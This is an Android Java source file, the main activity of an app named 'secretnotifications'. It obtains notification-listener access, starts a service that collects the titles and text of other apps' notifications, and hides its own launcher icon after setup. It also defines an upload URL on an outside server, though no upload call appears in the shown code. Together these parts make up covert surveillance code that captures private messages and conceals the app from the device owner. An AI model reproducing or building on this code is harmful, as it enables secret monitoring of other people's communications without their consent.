package com.ctel_rtc.secretnotifications;

import android.Manifest;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.StrictMode;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.NotificationCompat;
import android.support.v4.content.LocalBroadcastManager;
import android.support.v4.content.PermissionChecker;
import android.text.Html;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.TableLayout;
import android.widget.TableRow;
import android.widget.TextView;
import android.widget.Toast;

import net.gotev.uploadservice.MultipartUploadRequest;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.channels.FileChannel;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.UUID;


public class MainActivity extends Activity implements ActivityCompat.OnRequestPermissionsResultCallback, PermissionResultCallback {

    static TableLayout tab;
    TextView uploadData;
    PermissionUtils permissionUtils;
    ArrayList<String> permissions = new ArrayList<>();
    private Bitmap icon;
    private NotificationCompat.Builder notificationBuilder;
    private int currentNotificationID = 0;
    private NotificationManager notificationManager;
    public static PackageManager p;
    public static Context context;
    TextView getAllNotifications;
    public static String result;
    //   ProgressDialog progressDialog;
    public static Shared shared;
    public static final String UPLOAD_URL = "http://shopinfoapp.16mb.com/ImageUpload/uploadfile.php";
    TextView userNameTextView;
    ImageView send;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);
        tab = (TableLayout) findViewById(R.id.tab);
        context = MainActivity.this;
        send = (ImageView) findViewById(R.id.send);
        permissionUtils = new PermissionUtils(MainActivity.this);
        userNameTextView = (TextView) findViewById(R.id.userNameTextView);
        // permissions.add(Manifest.permission.READ_PHONE_STATE);
        // permissions.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
        //   permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        permissions.add(Manifest.permission.ACCESS_NOTIFICATION_POLICY);
        permissions.add(Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE);

        if (android.os.Build.VERSION.SDK_INT > 9) {
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            permissionUtils.check_permission(permissions, "Explain here why the app needs permissions", 1);
        } else {
            LocalBroadcastManager.getInstance(this).registerReceiver(onNotice, new IntentFilter("Msg"));
        }

        notificationManager = (NotificationManager) this.getSystemService(Context.NOTIFICATION_SERVICE);
        icon = BitmapFactory.decodeResource(this.getResources(),
                R.mipmap.ic_launcher);

        notificationAccessEnabled();

        Intent intent = new Intent(MainActivity.this, NotificationService.class);
        startService(intent);

        getAllNotifications = (TextView) findViewById(R.id.getAllNotifications);
        uploadData = (TextView) findViewById(R.id.uploadData);


        shared = new Shared(MainActivity.this);
        if (shared.getIsUploaded().equalsIgnoreCase("true")) {
            uploadData.setText("Uploaded File");
        }

        getAllNotifications.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

            }
        });

        send.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

               /* notificationBuilder = new NotificationCompat.Builder(MainActivity.this)
                        .setSmallIcon(R.mipmap.ic_launcher)
                        .setLargeIcon(icon)
                        .setContentTitle("Title")
                        .setContentText("text");
                sendNotification();*/

                if (userNameTextView.getText().toString().length() > 0) {
                    Shared sharing = new Shared(MainActivity.this);
                    sharing.setUserName(userNameTextView.getText().toString());
                    Toast.makeText(MainActivity.this, "Please Wait", Toast.LENGTH_SHORT).show();
                    disable();
                } else {
                    Toast.makeText(MainActivity.this, "Please enter User Name", Toast.LENGTH_SHORT).show();
                }

            }
        });

        uploadData.setVisibility(View.GONE);
        uploadData.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {


            }
        });

    }

    public void enable() {

        Log.e("enable", "enable_started");
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(context, com.ctel_rtc.secretnotifications.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        Log.e("enable", "enable_ended");

    }


    public void disable() {

        Log.e("enable", "enable_started");
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(context, com.ctel_rtc.secretnotifications.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        Log.e("enable", "enable_ended");

    }

    private BroadcastReceiver onNotice = new BroadcastReceiver() {

        @Override
        public void onReceive(Context context, Intent intent) {

            Log.e("m_notification", "came");
            String pack = intent.getStringExtra("package");
            String title = intent.getStringExtra("title");
            String text = intent.getStringExtra("text");

            Log.e("m_text", text);
            Log.e("m_Package", pack);
            Log.e("m_Title", title);
            Log.e("m_Text", text);

            TableRow tr = new TableRow(getApplicationContext());
            tr.setLayoutParams(new TableRow.LayoutParams(TableRow.LayoutParams.MATCH_PARENT, TableRow.LayoutParams.WRAP_CONTENT));
            TextView textview = new TextView(getApplicationContext());
            textview.setLayoutParams(new TableRow.LayoutParams(TableRow.LayoutParams.WRAP_CONTENT, TableRow.LayoutParams.WRAP_CONTENT, 1.0f));
            textview.setTextSize(20);
            textview.setTextColor(Color.parseColor("#0B0719"));
            textview.setText(Html.fromHtml(pack + "<br><b>" + title + " : </b>" + text));
            tr.addView(textview);
            tab.addView(tr);

        }
    };


    @Override
    public void PermissionGranted(int request_code) {
        LocalBroadcastManager.getInstance(this).registerReceiver(onNotice, new IntentFilter("Msg"));
    }

    @Override
    public void PartialPermissionGranted(int request_code, ArrayList<String> granted_permissions) {

    }

    @Override
    public void PermissionDenied(int request_code) {

    }

    @Override
    public void NeverAskAgain(int request_code) {

    }

    public static int notificationAccessEnabled() {

        ContentResolver contentResolver = context.getApplicationContext().getContentResolver();
        int srvAccessIsEnabled = 0;
        String ensv = Settings.Secure.getString(contentResolver, "enabled_notification_listeners");
        String myPackageName = context.getApplicationContext().getPackageName();

        if (ensv == null || !ensv.contains(myPackageName)) {

            srvAccessIsEnabled = 0;
            context.startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        } else {
            srvAccessIsEnabled = 1;
        }


        return srvAccessIsEnabled;
    }

}
